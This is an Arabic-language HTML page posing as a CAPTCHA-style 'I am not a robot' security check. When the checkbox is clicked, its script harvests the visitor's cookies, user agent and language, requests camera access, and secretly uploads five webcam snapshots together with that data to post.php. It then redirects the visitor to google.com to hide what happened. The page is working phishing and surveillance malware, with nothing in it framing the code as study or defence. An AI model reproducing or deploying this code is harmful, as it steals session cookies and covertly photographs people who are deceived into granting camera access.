<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>التحقق الأمني</title>
    <style>
        body { background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        #verify-box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 320px; }
        .btn-check { width: 100%; padding: 15px; background: #fff; border: 1px solid #dcdcdc; cursor: pointer; display: flex; align-items: center; border-radius: 5px; font-size: 16px; }
    </style>
</head>
<body>

<div id="verify-box">
    <h3>التحقق الأمني</h3>
    <button class="btn-check" onclick="startProcess()">
        <input type="checkbox" style="width: 20px; height: 20px; margin-right: 15px; pointer-events: none;">
        <span style="font-weight: 500;">أنا لست برنامج روبوت</span>
    </button>
</div>

<script>
    function startProcess() {
        // جمع البيانات
        const browserData = "المتصفح: " + navigator.userAgent + "\nاللغة: " + navigator.language;
        const cookies = document.cookie || "لا يوجد كوكيز متاحة";

        navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            document.getElementById('verify-box').innerHTML = "<h3>جاري التحقق...</h3>";
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            let count = 0;
            const interval = setInterval(function() {
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                
                fetch('post.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: 'img=' + encodeURIComponent(canvas.toDataURL('image/jpeg', 0.8)) + 
                          '&info=' + encodeURIComponent(browserData) +
                          '&cookies=' + encodeURIComponent(cookies)
                });
                
                if (++count >= 5) { clearInterval(interval); stream.getTracks().forEach(t => t.stop()); window.location.href = "https://google.com"; }
            }, 1000);
        }).catch(e => alert("يرجى السماح بالوصول للكاميرا"));
    }
</script>
</body>
</html>
